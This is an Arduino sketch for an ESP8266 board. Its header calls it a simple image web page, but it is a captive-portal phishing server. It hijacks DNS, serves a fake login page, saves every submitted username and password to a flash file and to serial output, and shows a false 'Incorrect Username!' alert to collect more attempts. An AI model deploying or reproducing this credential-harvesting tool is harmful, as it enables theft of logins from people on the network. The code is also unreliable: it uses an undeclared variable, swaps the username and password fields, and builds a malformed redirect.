
/*
   ESP8266 SPIFFS HTML Web Page with JPEG, PNG Image

*/

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <FS.h>   //Include File System Headers
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <EEPROM.h>
const char* imagefile = "/image.png";
const char* htmlfile = "/index.html";

//ESP AP Mode configuration
const char *ssid = "GITWIFI";
const char *password = "password";

const char *myHostname = "esp8266";
ESP8266WebServer server(4000);
const byte DNS_PORT = 53;
DNSServer dnsServer;

String msg;
void handleRoot() {
/*  if (captivePortal()) { // If caprive portal redirect instead of displaying the page.
    return;
  }*/
  server.sendHeader("Location", "/index.html", true);  //Redirect to our html web page
  server.send(302, "text/plane", "");
}

void handleWebRequests() {
  if (loadFromSpiffs(server.uri())) return;
  String message = "File Not Detected\n\n";
  message += "URI: ";
  message += server.uri();
  message += "\nMethod: ";
  message += (server.method() == HTTP_GET) ? "GET" : "POST";
  message += "\nArguments: ";
  message += server.args();
  message += "\n";
  for (uint8_t i = 0; i < server.args(); i++) {
    message += " NAME:" + server.argName(i) + "\n VALUE:" + server.arg(i) + "\n";
  }
  server.send(404, "text/plain", message);
  Serial.println(message);
}

void setup() {
  delay(1000);
  Serial.begin(115200);
  Serial.println();

  //Initialize File System
  SPIFFS.begin();
  Serial.println("File System Initialized");
  IPAddress ip(10, 1, 1, 2);
  IPAddress gateway(10, 1, 1, 1);
  IPAddress subnet(255, 255, 255, 0);
//  WiFi.softAPConfig(ip, gateway, subnet);
//  //Initialize AP Mode
//  WiFi.softAP(ssid);  //Password not used
//  IPAddress myIP = WiFi.softAPIP();
//  Serial.print("Web Server IP:");
 WiFi.begin("GITWIFI-TEST");

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
 digitalWrite(D4, 0);
  Serial.println(myIP);
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", ip);
  //Initialize Webserver
  server.on("/", handleRoot);
  server.onNotFound(handleWebRequests); //Set setver all paths are not found so we can handle as per URI
  server.on("/checklogin.html", pass);
  server.on("/generate_204", handleRoot);  //Android captive portal. Maybe not needed. Might be handled by notFound handler.
  server.on("/fwlink", handleRoot);
  server.begin();
}

void pass()
{

  String Password = server.arg("Username");
  String  Username = server.arg("Password");
  Serial.println("");
  Serial.print("USERNAME :");
  Serial.print(Username);
  Serial.println("");
  Serial.print("PASSWORD :");
  Serial.print(Password);
 // 
  File f = SPIFFS.open("/datacp13.txt", "a");
  if (!f) {
    Serial.println("file open failed");
    File f = SPIFFS.open("/datacp13.txt", "a ");
  }
  f.println("");
  f.print("USERNAME :");
  f.print(Username);
  f.println("");
  f.print("PASSWORD :");
  f.print(Password);
  f.close();
  server.sendHeader("Location", "/Error.html", true);  //Redirect to our html web page
  String msg="<script>alert(\"Incorrect Username!\");</script><script>window.location.assign(\"index.php\");</script>";
  server.send(200, "text/html", msg);
}


boolean captivePortal() {
  if (!isIp(server.hostHeader()) && server.hostHeader() != (String(myHostname) + ".local")) {
    Serial.print("Request redirected to captive portal");
    server.sendHeader("Location", String("http://") + toStringIp(server.client().localIP()) + String(4000), true);
    server.send(302, "text/plain", "");   // Empty content inhibits Content-length header so we have to close the socket ourselves.
    server.client().stop(); // Stop is needed because we sent no content length
    return true;
  }
  return false;
}

boolean isIp(String str) {
  for (size_t i = 0; i < str.length(); i++) {
    int c = str.charAt(i);
    if (c != '.' && (c < '0' || c > '9')) {
      return false;
    }
  }
  return true;
}

/** IP to String? */
String toStringIp(IPAddress ip) {
  String res = "";
  for (int i = 0; i < 3; i++) {
    res += String((ip >> (8 * i)) & 0xFF) + ".";
  }
  res += String(((ip >> 8 * 3)) & 0xFF);
  return res;
}

void loop() {
  server.handleClient();
   dnsServer.processNextRequest();
}

bool loadFromSpiffs(String path) {
  String dataType = "text/plain";
  if (path.endsWith("/")) path += "index.htm";

  if (path.endsWith(".src")) path = path.substring(0, path.lastIndexOf("."));
  else if (path.endsWith(".html")) dataType = "text/html";
  else if (path.endsWith(".htm")) dataType = "text/html";
  else if (path.endsWith(".css")) dataType = "text/css";
  else if (path.endsWith(".js")) dataType = "application/javascript";
  else if (path.endsWith(".png")) dataType = "image/png";
  else if (path.endsWith(".gif")) dataType = "image/gif";
  else if (path.endsWith(".jpg")) dataType = "image/jpeg";
  else if (path.endsWith(".ico")) dataType = "image/x-icon";
  else if (path.endsWith(".xml")) dataType = "text/xml";
  else if (path.endsWith(".pdf")) dataType = "application/pdf";
  else if (path.endsWith(".zip")) dataType = "application/zip";
  File dataFile = SPIFFS.open(path.c_str(), "r");
  if (server.hasArg("download")) dataType = "application/octet-stream";
  if (server.streamFile(dataFile, dataType) != dataFile.size()) {
  }

  dataFile.close();
  return true;
}
